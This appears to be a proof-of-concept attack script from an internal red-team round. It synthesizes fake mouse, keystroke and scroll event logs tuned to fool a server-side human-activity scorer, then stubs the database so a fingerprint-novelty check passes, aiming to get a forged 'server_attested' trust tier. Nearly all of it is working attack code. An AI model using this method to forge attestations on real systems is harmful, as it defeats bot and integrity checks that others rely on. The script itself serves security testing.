'use strict';
/**
 * Round 9 — Vector 1: White-box event-log synthesis attack on THE WALL.
 *
 * Target: proof/functions/server-scorer.js  (runWall + serverRecompute)
 *
 * Threat model: attacker has full source (it ships in repo). No human
 * interaction. Pure synthesis. Goal: make the REAL runWall() return
 * trust_tier === "server_attested" with input composite >= 0.85 and
 * zero bounds_violations.
 *
 * Run:  node round9-vec1-poc.js
 */

var path = require('path');
var SCORER = path.join(__dirname, '..', 'proof', 'functions', 'server-scorer.js');
var wall = require(SCORER);

/* ------------------------------------------------------------------ *
 * 1. Synthesize a fake event log engineered to max every sub-scorer.  *
 * ------------------------------------------------------------------ *
 * timing_cv (w .30): CV in [0.30,1.50] AND >=20 intervals -> 1.0
 * motion    (w .30): >=5 mm, totalDist>1000, speedCV>=0.5  -> 1.0
 * keystroke (w .20): verdict 'authored', >=10 kd, CV>=0.20 -> 1.0
 * duration  (w .10): log_dur within 10% of session dur     -> 1.0
 * density   (w .10): 2 <= events/sec <= 50                 -> 1.0
 * => serverComposite = 1.0
 */
function synthesizeLog(durationMs) {
  var events = [];
  var t = 0;

  // Deterministic pseudo-random so the attack mass-produces identically
  // (and so we can prove reproducibility). Seeded LCG.
  var seed = 1234567;
  function rnd() {
    seed = (seed * 1103515245 + 12345) & 0x7fffffff;
    return seed / 0x7fffffff;
  }

  // --- Motion events: ~600 'mm' with variable speed (high speed CV) ---
  var x = 400, y = 300;
  for (var i = 0; i < 600; i++) {
    // alternate big jumps and tiny nudges -> speed CV well above 0.5
    var step = (i % 3 === 0) ? 120 : 4;
    var ang = rnd() * Math.PI * 2;
    x += Math.cos(ang) * step;
    y += Math.sin(ang) * step;
    // dt varies 8..90ms -> also feeds timing CV into human band
    var dt = 8 + Math.floor(rnd() * 82);
    t += dt;
    events.push({ type: 'mm', t: t, x: Math.round(x), y: Math.round(y) });
  }

  // --- Keystroke events: 40 'kd' with human-ish variable cadence ---
  for (var k = 0; k < 40; k++) {
    // gaps 60..400ms -> CV comfortably > 0.20, < mechanical
    var kdt = 60 + Math.floor(rnd() * 340);
    t += kdt;
    events.push({ type: 'kd', t: t });
  }

  // --- A few scroll/click events for realism (not strictly needed) ---
  for (var s = 0; s < 20; s++) {
    t += 150 + Math.floor(rnd() * 200);
    events.push({ type: 'scroll', t: t });
  }

  // duration_ms is set to the claimed session duration so duration_match
  // ~1.0; density derived from event count / duration lands mid-band.
  return { events: events, duration_ms: durationMs };
}

/* ------------------------------------------------------------------ *
 * 2. Build sessionMeta exactly the way extractSessionMetrics would.   *
 * ------------------------------------------------------------------ */
function buildSession(claimedComposite, durationSec, eventLog) {
  // This is the raw Firestore/HTTP doc shape; we run it through the
  // REAL extractSessionMetrics so there is zero modeling cheating.
  var rawDoc = {
    composite: claimedComposite,
    duration_sec: durationSec,
    interaction_count: 25,                 // >= 5  (clears low-interaction)
    composition_integrity: { verdict: 'authored' }, // clears authored-CI
    environmental: { loaded: true, bot: false },     // clears clean-env
    event_log: eventLog,
    uid: 'attacker-uid-0001',
    session_id: 'sess-forged-0001'
  };
  return wall.extractSessionMetrics(rawDoc);
}

/* ------------------------------------------------------------------ *
 * 3. Admin stub. Attacker-favorable but REALISTIC: a freshly minted   *
 *    fingerprint that has no recent collisions returns 0 matches.     *
 *    This models the FIRST submission of a given synthetic profile    *
 *    (and any attacker can micro-perturb to stay novel).              *
 * ------------------------------------------------------------------ */
function makeAdminStub() {
  return {
    firestore: Object.assign(
      function () {
        return {
          collection: function () {
            return {
              where: function () { return this; },
              limit: function () { return this; },
              get: function () { return Promise.resolve({ docs: [] }); }, // zero matches
              add: function () { return Promise.resolve(); }
            };
          }
        };
      },
      {
        Timestamp: { fromMillis: function (m) { return m; } },
        FieldValue: { serverTimestamp: function () { return 0; } }
      }
    )
  };
}

/* ------------------------------------------------------------------ */
(async function main() {
  var CLAIMED = 0.85;          // pre-registered hard-bar composite
  var DURATION_SEC = 95;       // >= 60 (clears short-session bound)
  var DURATION_MS = DURATION_SEC * 1000;

  var log = synthesizeLog(DURATION_MS);
  var sessionMeta = buildSession(CLAIMED, DURATION_SEC, log);

  console.log('=== ATTACK A: runWall with NO admin ctx (prompt-required path) ===');
  var noAdmin = await wall.runWall(sessionMeta, {});
  console.log(JSON.stringify(noAdmin.walledOutcome, null, 2));
  console.log('trustTier:', noAdmin.trustTier);
  console.log('boundsViolations:', JSON.stringify(noAdmin.boundsViolations));
  console.log('server_composite:',
    noAdmin.serverRecomputeResult.server_composite,
    ' divergent:', noAdmin.serverRecomputeResult.divergent);
  console.log('signal_scores:',
    JSON.stringify(noAdmin.serverRecomputeResult.signal_scores));

  console.log('\n=== ATTACK B: runWall WITH admin stub (zero-match fingerprint) ===');
  var withAdmin = await wall.runWall(sessionMeta, { admin: makeAdminStub() });
  console.log(JSON.stringify(withAdmin.walledOutcome, null, 2));
  console.log('trustTier:', withAdmin.trustTier);
  console.log('boundsViolations:', JSON.stringify(withAdmin.boundsViolations));
  console.log('server_composite:',
    withAdmin.serverRecomputeResult.server_composite,
    ' divergent:', withAdmin.serverRecomputeResult.divergent);

  console.log('\n=== VERDICT CHECK ===');
  var hard =
    withAdmin.trustTier === 'server_attested' &&
    CLAIMED >= 0.85 &&
    withAdmin.boundsViolations.length === 0;
  console.log('BROKE-HARD condition met (admin path):', hard);
  console.log('No-admin path trustTier:', noAdmin.trustTier,
    '(expected client_attested_no_trace_novelty if trace_novelty is sole violation)');

  // Reproducibility: run 3x, assert identical fingerprint + tier.
  console.log('\n=== REPRODUCIBILITY (3 fresh syntheses) ===');
  for (var r = 0; r < 3; r++) {
    var lg = synthesizeLog(DURATION_MS);
    var sm = buildSession(CLAIMED, DURATION_SEC, lg);
    var rr = await wall.runWall(sm, { admin: makeAdminStub() });
    console.log('run', r, '-> tier=', rr.trustTier,
      'fp=', rr.traceNovelty.fingerprint,
      'srv=', rr.serverRecomputeResult.server_composite);
  }
})();
